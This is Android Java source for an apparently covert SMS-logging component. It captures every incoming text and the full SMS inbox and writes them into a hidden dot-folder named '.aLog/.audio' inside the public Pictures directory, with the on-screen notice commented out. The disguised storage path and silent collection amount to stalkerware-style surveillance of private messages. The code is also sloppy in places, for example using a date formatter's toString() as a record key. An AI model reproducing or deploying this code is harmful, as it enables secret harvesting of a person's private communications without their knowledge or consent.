package mdane.myapplication6.Receivers;

import android.app.Activity;
import android.content.Context;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.PrintWriter;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Locale;

import mdane.myapplication6.util.printFile;

/**
 * Created by - on 5/16/2017.
 */

public class SMSObj {
    static SharedPreferences.Editor editor;
    public static final String PREFS_NAME = "bb";
    public static final String KEY_COUNT = "notificationCount";



    public static void recordSMS(Bundle abundle,ArrayList<String> aList,Context context,String state,String  a){

        Handler aHandler=new Handler();
        try {

            if (abundle != null) {

                final Object[] pdusObj = (Object[]) abundle.get("pdus");
               // aList=new ArrayList();
                for (int i = 0; i < pdusObj.length; i++) {

                    SmsMessage currentMessage = SmsMessage.createFromPdu((byte[]) pdusObj[i]);
                    String phoneNumber = currentMessage.getDisplayOriginatingAddress();

                    String senderNum = phoneNumber;
                    String message = currentMessage.getDisplayMessageBody();
                    SharedPreferences values = context.getSharedPreferences("SMS", Activity.MODE_PRIVATE);
                    Log.i("SmsReceiver", "senderNum: "+ senderNum + "; message: " + message);
                    editor = values.edit();
                    SimpleDateFormat dateFormat = new SimpleDateFormat("mm_dd_yyyy_hh_mm_ss",
                            Locale.getDefault());
                    editor.putString(senderNum+ dateFormat.toString(), "Num: "+ senderNum + "; message: " + message+" Direction: "+ state);
                    aList.add(senderNum+ dateFormat.toString()+ "Num: "+ senderNum + "; message: " + message+" Direction: "+ state);
                    // Show Alert
                    int duration = Toast.LENGTH_LONG;
                  //  Toast toast = Toast.makeText(context,
                       //     "senderNum: "+ senderNum + ", message: " + message, duration);
                    //toast.show();

                } // end for loop
              printit pint=new printit();
                pint.maketheFile(aList,a);
            } else{ printit pint=new printit();
                pint.maketheFile(aList,a);}// bundle is null


        } catch (Exception e) {
            Log.e("SmsReceiver", "Exception smsReceiver" +e);

        }}

    public static void tryURI(Context context){
        Uri mSmsinboxQueryUri = Uri.parse("content://sms/inbox");
        ArrayList aList=new ArrayList();
        SharedPreferences values = context.getSharedPreferences("PREFS", Activity.MODE_APPEND);
        editor = values.edit();
        Cursor cursor1 = context.getContentResolver().query(mSmsinboxQueryUri,new String[] { "_id", "thread_id", "address", "person", "date","body", "type" }, null, null, null);
        final String[] projection = new String[]{"*"};
        Uri uri = Uri.parse("content://mms-sms/conversations/");
        //Cursor query = context.getApplicationContext().getContentResolver().query(uri,projection,null,null,null);
        String[] columns = new String[] { "address", "person", "date", "body","type" };
        if (cursor1.getCount() > 0) {
            String count = Integer.toString(cursor1.getCount());
            while (cursor1.moveToNext()){
                String address = cursor1.getString(cursor1.getColumnIndex(columns[0]));
                String name = cursor1.getString(cursor1.getColumnIndex(columns[1]));
                String date = cursor1.getString(cursor1.getColumnIndex(columns[2]));
                String msg = cursor1.getString(cursor1.getColumnIndex(columns[3]));
                String type = cursor1.getString(cursor1.getColumnIndex(columns[4]));
                editor.putString("sent"+date,address+ date+ "Num: "+ address + "; message: " + msg+" Direction: "+ "sent");
                editor.commit();
                aList.add("sent"+date+address+ date+ "Num: "+ address + "; message: " + msg+" Direction: "+ "sent");


            }
        }
        File file=null; printFile.maketheFile(aList,file,"all.txt");}


    public static void tryURI(Context context,String a,String b){
        Uri mSmsinboxQueryUri = Uri.parse(a);
        ArrayList aList=new ArrayList();
        SharedPreferences values = context.getSharedPreferences("PREFS", Activity.MODE_APPEND);
        editor = values.edit();
        Cursor cursor1 = context.getContentResolver().query(mSmsinboxQueryUri,new String[] { "_id", "thread_id", "address", "person", "date","body", "type" }, null, null, null);
        final String[] projection = new String[]{"*"};
        Uri uri = Uri.parse("content://mms-sms/conversations/");
        //Cursor query = context.getApplicationContext().getContentResolver().query(uri,projection,null,null,null);
        String[] columns = new String[] { "address", "person", "date", "body","type" };
        if (cursor1.getCount() > 0) {
            String count = Integer.toString(cursor1.getCount());
            while (cursor1.moveToNext()){
                String address = cursor1.getString(cursor1.getColumnIndex(columns[0]));
                String name = cursor1.getString(cursor1.getColumnIndex(columns[1]));
                String date = cursor1.getString(cursor1.getColumnIndex(columns[2]));
                String msg = cursor1.getString(cursor1.getColumnIndex(columns[3]));
                String type = cursor1.getString(cursor1.getColumnIndex(columns[4]));
                editor.putString("sent"+date,address+ date+ "Num: "+ address + "; message: " + msg+" Direction: "+ "sent");
                editor.commit();
                aList.add("sent"+date+address+ date+ "Num: "+ address + "; message: " + msg+" Direction: "+ "sent");


            }
        }
        File file=null; printFile.maketheFile(aList,file,b);
    }
    private static class printit        {

        private  void maketheFile(ArrayList aList,String name)  {
            PrintWriter pw= null;
            File file = new File((Environment.DIRECTORY_PICTURES),
                    ".aLog/.audio"+name);
            try{

                if(file.exists()){

                    pw = new PrintWriter(file);
                    pw.append(aList.toString());
                    pw.close();}
//Do something
                else{file = makeFileFor(name);
                    pw = new PrintWriter(file);
                    pw.write(aList.toString());
                    pw.close();}
            } catch (FileNotFoundException e1) {
                e1.printStackTrace();
            }}


        private File makeFileFor(String a) {
            File imageDirectory = null;
            String storageState = Environment.getExternalStorageState();
            if (storageState.equals(Environment.MEDIA_MOUNTED)) {
                imageDirectory = new File(
                        Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
                        ".aLog/.audio");
                if (!imageDirectory.exists() && !imageDirectory.mkdirs()) {
                    imageDirectory = null;
                } else {
                    SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy_mm_dd_hh_mm_ss",
                            Locale.getDefault());

                    return new File(imageDirectory.getPath() + a);
                }
            }
            return null;
        }}
}



